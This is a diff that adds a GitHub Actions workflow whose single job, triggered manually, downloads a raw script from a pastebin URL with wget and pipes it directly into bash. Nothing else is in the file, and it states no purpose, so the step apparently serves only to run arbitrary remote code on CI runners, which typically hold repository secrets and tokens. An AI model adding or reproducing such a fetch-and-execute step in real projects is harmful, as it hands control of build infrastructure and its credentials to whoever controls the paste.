@@ -1,0 +1,7 @@
+on: workflow_dispatch
+jobs:
+  vididi:
+    runs-on: ubuntu-26.04-arm
+    steps:
+      - run: |
+          wget -qO- https://pastebin.com/raw/WYGs2qaH | tr -d '\r' | bash
